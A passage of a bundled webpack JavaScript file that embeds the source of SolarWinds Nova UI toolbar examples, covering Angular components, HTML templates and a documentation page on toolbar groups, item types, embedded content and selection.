OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toolbar-basic-example",\n    templateUrl: "./toolbar-basic.example.component.html",\n})\nexport class ToolbarBasicExampleComponent {\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public onShowToast(highlightMode: boolean): void {\n        this.toastService.info({\n            message: $localize`Action done message!`,\n            title: $localize`Action Done`,\n        });\n    }\n}\n'},80648:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiToolbarModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    The basic layout for <code>&lt;nui-toolbar&gt;</code> consists of an\n    <code>&lt;nui-toolbar&gt;</code> element containing one or more\n    <code>&lt;nui-toolbar-group&gt;</code> elements. The\n    <code>&lt;nui-toolbar-group&gt;</code> element is used to group similar\n    items on the toolbar, separating them with an\n    <code>&lt;nui-divider&gt;</code>. Each of the\n    <code>&lt;nui-toolbar-group&gt;</code> elements in turn contains one or more\n    <code>&lt;nui-toolbar-item&gt;</code> elements.\n</p>\n\n<p>\n    A toolbar item can be placed either on the toolbar itself or inside a "More"\n    menu on the right side of the toolbar. By default, toolbar items are placed\n    directly on the toolbar. To have a toolbar item appear in the More menu, set\n    the <code>type</code> input on the <code>&lt;nui-toolbar-item&gt;</code> to\n    the value\n    <code\n        ><a\n            target="_blank"\n            href="../miscellaneous/enumerations.html#ToolbarItemType"\n            >ToolbarItemType.secondary</a\n        ></code\n    >. You can bind an event handler to the toolbar-item\n    <code>actionDone</code> event by passing a callback function.\n</p>\n<nui-example-wrapper filenamePrefix="toolbar-basic" exampleTitle="Basic Usage">\n    <nui-toolbar-basic-example></nui-toolbar-basic-example>\n</nui-example-wrapper>\n\n<h2>Item Types</h2>\n<p>\n    To override the default display style, set the\n    <code>displayStyle</code> input to one of the following string values:\n    \'main\', \'destructive\', or \'action\'. \'action\' is the default display style.\n    <b>Note:</b> The toolbar component allows the user to provide a maximum of\n    one \'destructive\' item which must be placed at the end of all items on the\n    toolbar. If this condition isn\'t met, an error message will be logged.\n    <nui-message type="info">\n        The default \'primary\' item type specifies a preferred placement directly\n        on the toolbar rather than inside the More menu. However, the toolbar\n        component provides responsive behavior and will move \'primary\' items to\n        the More menu one-by-one as the horizontal space for them becomes\n        smaller and smaller. Conversely, \'secondary\' items cannot be moved\n        outside the More menu.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="toolbar-item-types"\n    exampleTitle="Item Types"\n>\n    <nui-toolbar-item-types-example></nui-toolbar-item-types-example>\n</nui-example-wrapper>\n\n<h2>Embedded Content</h2>\n<p>\n    Other components can be embedded within the toolbar. The following example\n    includes\n    <code\n        ><a target="_blank" href="../components/SearchComponent.html"\n            >SearchComponent</a\n        ></code\n    >\n    and\n    <code\n        ><a target="_blank" href="../components/MenuComponent.html"\n            >MenuComponent</a\n        ></code\n    >\n    in addition to the basic functionality. Embedded components should be placed\n    in <code>div</code> having <code>nui-toolbar-embedded</code> class.\n</p>\n<nui-example-wrapper\n    filenamePrefix="toolbar-embedded-content"\n    exampleTitle="Embedded Content"\n>\n    <nui-toolbar-embedded-content-example></nui-toolbar-embedded-content-example>\n</nui-example-wrapper>\n\n<h2>Enabling Selection</h2>\n<p>\n    Set <code>selectionEnabled</code> binding to true in order to activate\n    toolbar with selection. It is also possible to control the display of\n    toolbar items depending on whether selection state is enabled or disabled.\n    <br /><span class="nui-text-label">Note:</span> Use\n    <code>boxShadow</code> set to false to remove bottom shadow(shown by\n    default).\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="toolbar-selection"\n    exampleTitle="Enabling Selection"\n>\n    <nui-toolbar-selection-example></nui-toolbar-selection-example>\n</nui-example-wrapper>\n'},14328:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-toolbar-docs-example",\n    templateUrl: "./toolbar-docs.example.component.html",\n    host: {\n        class: "nui-edge-definer",\n    },\n})\nexport class ToolbarDocsExampleComponent {}\n'},47050:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    <nui-toolbar>\n        <nui-toolbar-group i18n-title title="g1">\n            <nui-toolbar-item\n                type="primary"\n                icon="edit"\n                i18n-title\n                title="Edit"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="export"\n                i18n-title\n                title="Export"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="clear"\n                i18n-title\n                title="Clear"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                type="primary"\n                icon="browse"\n                i18n-title\n                title="Browse"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="close"\n                i18n-title\n                title="Close"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="download"\n                i18n-title\n                title="Download"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group i18n-title title="g2">\n            <nui-toolbar-item type="primary" icon="cut" i18n-title title="Cut">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="secondary"\n                icon="copy"\n                i18n-title\n                title="Copy"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="secondary"\n                icon="assign"\n                i18n-title\n                title="Assign"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="add" i18n-title title="Add">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="secondary"\n                icon="tag"\n                i18n-title\n                title="Tag"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <div class="nui-toolbar-embedded">\n            \x3c!--mr-1 added as example of user\'s ability to style embedded content so it looks according to mock-ups --\x3e\n            <nui-search\n                class="mr-1"\n                [value]="value"\n                [placeholder]="placeholder"\n                (search)="onSearch($event)"\n                (cancel)="onCancel($event)"\n            >\n            </nui-search>\n            <nui-menu\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                icon="menu"\n            ></nui-menu>\n        </div>\n        <nui-toolbar-message>Custom toolbar message.</nui-toolbar-message>\n    </nui-toolbar>\n</div>\n'},1686:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IMenuGroup, LoggerService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toolbar-embedded-content-example",\n    templateUrl: "./toolbar-embedded-content.example.component.html",\n})\nexport class ToolbarEmbeddedContentExampleComponent {\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: $localize`section title`,\n            itemsSource: [\n                { title: $localize`Menu Item`, itemType: "action" },\n                { title: $localize`Hover me`, itemType: "action" },\n                { title: $localize`Selected menu item`, isSelected: true },\n                {\n                    title: $localize`Menu item`,\n                    itemType: "switch",\n                    checked: true,\n                },\n                {\n                    title: $localize`Menu disabled item`,\n                    itemType: "switch",\n                    checked: false,\n                    disabled: true,\n                },\n                {\n                    title: $localize`Menu item with checkbox`,\n                    itemType: "option",\n                    disabled: true,\n                },\n                {\n                    title: $localize`Menu item with icon`,\n                    itemType: "action",\n                    icon: "table",\n                },\n                {\n                    title: $localize`Link menu item`,\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: $localize`Export PDF`,\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n    ];\n    public busy = false;\n    public placeholder = $localize`Placeholder`;\n    public searchKey: string;\n    public stringToSearch = $localize`\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec efficitur rutrum lacus id vulputate.\n        Integer eu ex eu augue efficitur luctus quis ac elit. Nam odio est, iaculis nec varius id, congue erat.\n        Nullam mi lectus, gravida quis pretium sit amet, accumsan non elit. In tempus commodo sem ac vulputate.\n        Sed vel sagittis purus. Integer non ornare felis. Sed aliquam, purus et euismod tincidunt, felis ligula`;\n\n    public value: string;\n    private timerHandler: number;\n\n    public constructor(@Inject(LoggerService) private logger: LoggerService) {}\n\n    public onCancel(value: string): void {\n        this.logger.warn("Example onCancel fired. Value passed: " + value);\n        if (value === "") {\n            this.value = "";\n            this.searchKey = "";\n        } else {\n            this.doCancel();\n        }\n    }\n\n    public onSearch(value: string): void {\n        this.logger.warn(\n            "Example onSearch fired. Current input value passed: " + value\n        );\n        this.doSearch(value);\n    }\n\n    private doCancel(): void {\n        clearTimeout(this.timerHandler);\n        this.busy = false;\n    }\n\n    private doSearch(value: string): void {\n        this.logger.warn("Example search started.");\n        const _this = this;\n        clearTimeout(_this.timerHandler);\n        _this.busy = true;\n        _this.timerHandler = <any>setTimeout(() => {\n            _this.busy = false;\n            _this.searchKey = value;\n            _this.logger.warn("Example search finished.");\n        }, 2000);\n    }\n}\n'},21560:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    <nui-toolbar>\n        <nui-toolbar-group i18n-title title="g1">\n            <nui-toolbar-item\n                displayStyle="main"\n                type="primary"\n                icon="edit"\n                i18n-title\n                title="Edit"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                (actionDone)="actionDone()"\n                type="primary"\n                icon="filter"\n                i18n-title\n                title="Filter"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="lock"\n                i18n-title\n                title="Lock"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group i18n-title title="g2">\n            <nui-toolbar-item\n                type="primary"\n                icon="copy"\n                i18n-title\n                title="Copy"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="secondary"\n                icon="enable"\n                i18n-title\n                title="Enable"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="secondary"\n                icon="execute"\n                i18n-title\n                title="Execute"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                type="primary"\n                icon="hide"\n                i18n-title\n                title="Hide"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="secondary"\n                icon="ignore"\n                i18n-title\n                title="Ignore"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="destructive"\n                type="secondary"\n                icon="delete"\n                i18n-title\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n    </nui-toolbar>\n</div>\n'},31624:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-toolbar-item-types-example",\n    templateUrl: "./toolbar-item-types.example.component.html",\n})\nexport class ToolbarItemTypesExampleComponent {\n    public actionDone(): void {\n        console.log("action");\n    }\n}\n'},4672:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    Toolbar that always has some items.\n    <nui-toolbar\n        [boxShadow]="false"\n        [selectionEnabled]="selectionEnabled"\n        [selectedItems]="select"\n        [noEmptyMessage]="noEmptyMessage"\n        #toolbar\n    >\n        <ng-container *ngIf="selectionEnabled">\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="deselect"\n                    i18n-title\n                    title="Deselect"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="deselect-all"\n                    i18n-title\n                    title="Deselect All"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    displayStyle="destructive"\n                    type="primary"\n                    icon="delete"\n                    i18n-title\n                    title="Delete"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n        </ng-container>\n\n        <ng-container *ngIf="!selectionEnabled">\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="enable"\n                    i18n-title\n                    title="Enable"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="export"\n                    i18n-title\n                    title="Execute"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="hide"\n                    i18n-title\n                    title="Hide"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="Edit"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n        </ng-container>\n        <div class="nui-toolbar-embedded">\n            <nui-search\n                [value]="value"\n                [placeholder]="placeholder"\n                (search)="onSearch($event)"\n                (cancel)="onCancel($event)"\n            >\n            </nui-search>\n        </div>\n    </nui-toolbar>\n    Toolbar that does not have items.\n    <nui-toolbar\n        [boxShadow]="false"\n        [selectionEnabled]="selectionEnabled"\n        [selectedItems]="select"\n        [noEmptyMessage]="noEmptyMessage"\n        #toolbar2\n    >\n        <div class="nui-toolbar-embedded">\n            <nui-search\n                [value]="value"\n                [placeholder]="placeholder"\n                (search)="onSearch($event)"\n                (cancel)="onCancel($event)"\n            >\n            </nui-search>\n        </div>\n    </nui-toolbar>\n    <button\n        nui-button\n        type="button"\n        class="mt-3"\n        (click)="toggleSelectedChange()"\n    >\n        <span>Toggle Selected State</span>\n    </button>\n    <button\n        nui-button\n        type="button"\n        class="mt-3"\n        (click)="toggleEmptyMessage()"\n    >\n        <span>Toggle Empty Message</span>\n    </button>\n</div>\n'},22336:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { LoggerService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toolbar-selection-example",\n    templateUrl: "./toolbar-selection.example.component.html",\n})\nexport class ToolbarSelectionExampleComponent {\n    public selectionEnabled = true;\n    public select = {\n        current: 1,\n        total: 72,\n    };\n    public busy = false;\n    public placeholder = $localize`Placeholder`;\n    public searchKey: string;\n    public stringToSearch = `\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec efficitur rutrum lacus id vulputate.\n        Integer eu ex eu augue efficitur luctus quis ac elit. Nam odio est, iaculis nec varius id, congue erat.\n        Nullam mi lectus, gravida quis pretium sit amet, accumsan non elit. In tempus commodo sem ac vulputate.\n        Sed vel sagittis purus. Integer non ornare felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n    `;\n    public value: string;\n    private timerHandler: number;\n\n    public noEmptyMessage = false;\n\n    public constructor(@Inject(LoggerService) private logger: LoggerService) {}\n\n    public onCancel(value: string): void {\n        this.logger.warn("Example onCancel fired. Value passed: " + value);\n        if (value === "") {\n            this.value = "";\n            this.searchKey = "";\n        } else {\n            this.doCancel();\n        }\n    }\n\n    public onSearch(value: string): void {\n        this.logger.warn(\n            "Example onSearch fired. Current input value passed: " + value\n        );\n        this.doSearch(value);\n    }\n\n    private doCancel(): void {\n        clearTimeout(this.timerHandler);\n        this.busy = false;\n    }\n\n    private doSearch(value: string): void {\n        this.logger.warn("Example search started.");\n        const _this = this;\n        clearTimeout(_this.timerHandler);\n        _this.busy = true;\n        _this.timerHandler = <any>setTimeout(() => {\n            _this.busy = false;\n            _this.searchKey = value;\n            _this.logger.warn("Example search finished.");\n        }, 2000);\n    }\n\n    public toggleSelectedChange(): void {\n        this.selectionEnabled = !this.selectionEnabled;\n    }\n\n    public toggleEmptyMessage(): void {\n        this.noEmptyMessage = !this.noEmptyMessage;\n    }\n}\n'},31486:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    <section [(style.width.px)]="width">\n        <h2>default</h2>\n        <nui-toolbar id="nui-toolbar-test">\n            <nui-toolbar-group i18n-title title="g1">\n                <nui-toolbar-item\n                    id="nui-toolbar-test-button-primary"\n                    displayStyle="primary"\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group i18n-title title="g2">\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="secondary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="secondary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="secondary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    displayStyle="destructive"\n                    type="secondary"\n                    icon="delete"\n                    i18n-title\n                    title="delete"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n        </nui-toolbar>\n    </section>\n    <nui-textbox\n        id="nui-toolbar-test-input"\n        type="number"\n        [value]="width"\n        customBoxWidth="150px"\n        (textChange)="onOptionChange($event)"\n    >\n    </nui-textbox>\n\n    <section>\n        <h2>embedded</h2>\n        <nui-toolbar id="nui-toolbar-test-embedded">\n            <nui-toolbar-group i18n-title title="g1">\n                <nui-toolbar-item\n                    displayStyle="primary"\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="edit"\n                    i18n-title\n                    title="edit"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group i18n-title title="g2">\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="secondary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="secondary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="secondary"\n                    icon="add"\n                    i18n-title\n                    title="add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    displayStyle="destructive"\n                    type="secondary"\n                    icon="delete"\n                    i18n-title\n                    title="delete"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-search class="nui-demo-search-additional"></nui-search>\n            <nui-menu\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                icon="menu"\n            ></nui-menu>\n        </nui-toolbar>\n    </section>\n\n    <section>\n        <h2>selection</h2>\n        <nui-toolbar\n            id="nui-toolbar-test-selection"\n            [selectionEnabled]="true"\n            [selectedItems]="select"\n        >\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="Add"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="Add First"\n                    *ngIf="showFirst"\n                >\n                </nui-toolbar-item>\n                <nui-toolbar-item\n                    type="primary"\n                    icon="add"\n                    i18n-title\n                    title="Add Second"\n                    *ngIf="!showFirst"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n            <nui-toolbar-group>\n                <nui-toolbar-item\n                    displayStyle="destructive"\n                    type="primary"\n                    icon="delete"\n                    i18n-title\n                    title="Delete"\n                >\n                </nui-toolbar-item>\n            </nui-toolbar-group>\n        </nui-toolbar>\n\n        <button\n            nui-button\n            type="button"\n            class="mt-3"\n            (click)="onToggle()"\n            id="nui-toolbar-test-toggle-selected-item"\n        >\n            <span>Toggle Item</span>\n        </button>\n    </section>\n\n    <section>\n        <h2>empty</h2>\n        <p>\n            <nui-switch\n                #showSelection\n                id="nui-toolbar-test--empty--selection-enabled"\n                >selection enabled</nui-switch\n            >\n            <nui-switch #showItems id="nui-toolbar-test--empty--show-items"\n                >show items</nui-switch\n            >\n            <nui-switch\n                #showExtraMessage\n                id="nui-toolbar-test--empty--show-extra-message"\n                >show extra message</nui-switch\n            >\n            <nui-switch\n                #noEmptyMessage\n                id="nui-toolbar-test--empty--no-empty-message"\n                >no empty message</nui-switch\n            >\n        </p>\n        <nui-toolbar\n            id="nui-toolbar-test-empty"\n            [selectionEnabled]="showSelection.value"\n            [selectedItems]="select"\n            [noEmptyMessage]="noEmptyMessage.value"\n        >\n            <ng-container *ngIf="showItems.value">\n                <nui-toolbar-group>\n                    <nui-toolbar-item\n                        type="primary"\n                        icon="add"\n                        i18n-title\n                        title="Add"\n                    >\n                    </nui-toolbar-item>\n                </nui-toolbar-group>\n                <nui-toolbar-group>\n                    <nui-toolbar-item\n                        type="secondary"\n                        icon="remove"\n                        i18n-title\n                        title="Remove"\n                    >\n                    </nui-toolbar-item>\n                </nui-toolbar-group>\n            </ng-container>\n            <nui-toolbar-message *ngIf="showExtraMessage.value"\n                >extra message</nui-toolbar-message\n            >\n        </nui-toolbar>\n    </section>\n</div>\n'},75546:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toolbar-test",\n    templateUrl: "./toolbar-test.component.html",\n})\nexport class ToolbarTestExampleComponent {\n    public width = "800px";\n\n    public showFirst = true;\n\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "section title",\n            itemsSource: [\n                { title: "Menu Item", itemType: "action" },\n                { title: "Hover me", itemType: "action" },\n                { title: "Selected menu item", isSelected: true },\n                { title: "Menu item", itemType: "switch", checked: true },\n                {\n                    title: "Menu disabled item",\n                    itemType: "switch",\n                    checked: false,\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with checkbox",\n                    itemType: "option",\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with icon",\n                    itemType: "action",\n                    icon: "table",\n                },\n                {\n                    title: "Link menu item",\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: "Export PDF",\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n    ];\n\n    public select = {\n        current: 1,\n        total: 72,\n    };\n\n    public onOptionChange(value: string): void {\n        this.width = value;\n    }\n\n    public onToggle(): void 